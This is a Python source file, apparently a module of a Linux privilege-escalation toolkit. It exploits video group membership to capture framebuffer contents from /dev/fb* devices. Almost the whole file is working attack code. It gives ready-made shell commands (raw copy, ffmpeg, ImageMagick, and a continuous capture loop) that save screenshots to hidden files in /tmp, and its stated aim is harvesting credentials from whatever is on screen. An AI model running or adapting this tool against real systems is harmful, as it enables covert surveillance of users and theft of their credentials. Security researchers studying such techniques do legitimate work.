"""
Video Group Exploitation
========================

Exploit video group membership for framebuffer access.

How it works:
1. Video group has access to /dev/fb* devices
2. Can capture framebuffer content (screenshots)
3. Potential for credential harvesting from displayed content
"""

import os
from pathlib import Path
from typing import Optional, List

from .base import BaseGroupExploit
from ..core.groups import GroupFinding, ExploitResult, ExploitStatus


class VideoExploit(BaseGroupExploit):
    """
    Exploit video group membership.

    Captures framebuffer for potential credential harvesting.
    Success rate: ~70%
    """

    def __init__(self, finding: GroupFinding, verbose: bool = False):
        super().__init__(finding, verbose)
        self._fb_device = None

    def check_available(self) -> bool:
        """Check if video exploitation is possible"""
        # Find framebuffer devices
        fb_devices = list(Path('/dev').glob('fb*'))

        if not fb_devices:
            self.log("No framebuffer devices found", "error")
            return False

        self._fb_device = str(fb_devices[0])
        self.log(f"Framebuffer device: {self._fb_device}", "success")

        # Check access
        if not os.access(self._fb_device, os.R_OK):
            self.log(f"Cannot read {self._fb_device}", "error")
            return False

        self.log("Framebuffer access verified", "success")
        return True

    def get_methods(self) -> List[dict]:
        """Get available video exploitation methods"""
        fb = self._fb_device or '/dev/fb0'

        return [
            {
                'name': 'capture_raw',
                'description': 'Capture raw framebuffer data',
                'command': f"cp {fb} /tmp/.fb_capture.raw",
                'interactive': False
            },
            {
                'name': 'capture_ffmpeg',
                'description': 'Capture screenshot using ffmpeg',
                'command': f"ffmpeg -f fbdev -i {fb} -frames:v 1 /tmp/.screenshot.png",
                'interactive': False,
                'requires': 'ffmpeg'
            },
            {
                'name': 'capture_convert',
                'description': 'Capture and convert using ImageMagick',
                'command': f"cat {fb} > /tmp/.fb.raw && convert -size 1920x1080 -depth 8 rgba:/tmp/.fb.raw /tmp/.screenshot.png",
                'interactive': False,
                'requires': 'convert'
            },
            {
                'name': 'continuous_capture',
                'description': 'Continuous capture (requires manual stop)',
                'command': f"while true; do cp {fb} /tmp/.fb_$(date +%s).raw; sleep 5; done",
                'interactive': True
            }
        ]

    def exploit(
            self,
            method: Optional[str] = None,
            interactive: bool = False
    ) -> ExploitResult:
        """
        Execute video exploitation.

        Args:
            method: Specific method to use
            interactive: Allow interactive operation

        Returns:
            ExploitResult
        """
        self.log("Attempting video group exploitation...", "info")

        # Check availability
        if not self.check_available():
            return ExploitResult(
                finding=self.finding,
                method="N/A",
                status=ExploitStatus.ERROR,
                error="Framebuffer not accessible"
            )

        # Get methods
        methods = self.get_methods()

        # Select method
        if method:
            selected = next((m for m in methods if m['name'] == method), None)
            if not selected:
                return ExploitResult(
                    finding=self.finding,
                    method=method,
                    status=ExploitStatus.ERROR,
                    error=f"Unknown method: {method}"
                )
        else:
            # Choose best available method
            if self.check_binary_exists('ffmpeg'):
                selected = methods[1]  # ffmpeg
            elif self.check_binary_exists('convert'):
                selected = methods[2]  # imagemagick
            else:
                selected = methods[0]  # raw capture

        self.log(f"Using method: {selected['name']}", "info")

        # Check requirements
        if selected.get('requires'):
            if not self.check_binary_exists(selected['requires']):
                self.log(f"{selected['requires']} not found, falling back to raw capture", "warning")
                selected = methods[0]

        # Handle interactive
        if selected.get('interactive') and not interactive:
            self.log("Method requires interactive operation", "warning")
            return ExploitResult(
                finding=self.finding,
                method=selected['name'],
                status=ExploitStatus.MANUAL,
                output=f"Run manually: {selected['command']}"
            )

        # Execute
        self.log(f"Capturing framebuffer...", "info")

        returncode, stdout, stderr = self.run_command(selected['command'], timeout=30)

        if returncode == 0:
            self.log("Framebuffer captured!", "success")

            artifacts = []

            # Identify output file
            if 'screenshot.png' in selected['command']:
                artifacts.append('/tmp/.screenshot.png')
                self.log("Screenshot saved: /tmp/.screenshot.png", "success")
            else:
                artifacts.append('/tmp/.fb_capture.raw')
                self.log("Raw capture saved: /tmp/.fb_capture.raw", "success")
                self.log(
                    "Convert with: ffmpeg -f rawvideo -pix_fmt rgba -s 1920x1080 -i /tmp/.fb_capture.raw /tmp/screenshot.png",
                    "info")

            return ExploitResult(
                finding=self.finding,
                method=selected['name'],
                status=ExploitStatus.SUCCESS,
                output=stdout,
                got_root=False,  # Video doesn't give root
                artifacts=artifacts
            )
        else:
            self.log(f"Capture failed: {stderr}", "error")

            return ExploitResult(
                finding=self.finding,
                method=selected['name'],
                status=ExploitStatus.FAILED,
                error=stderr
            )

    def get_framebuffer_info(self) -> None:
        """Display framebuffer information"""
        self.log("Framebuffer information:", "info")

        # List fb devices
        returncode, stdout, _ = self.run_command("ls -la /dev/fb*")
        if returncode == 0:
            print(stdout)

        # Get resolution if available
        if os.path.exists('/sys/class/graphics/fb0/virtual_size'):
            try:
                with open('/sys/class/graphics/fb0/virtual_size', 'r') as f:
                    size = f.read().strip()
                    self.log(f"Resolution: {size}", "info")
            except:
                pass

        # Get bits per pixel
        if os.path.exists('/sys/class/graphics/fb0/bits_per_pixel'):
            try:
                with open('/sys/class/graphics/fb0/bits_per_pixel', 'r') as f:
                    bpp = f.read().strip()
                    self.log(f"Bits per pixel: {bpp}", "info")
            except:
                pass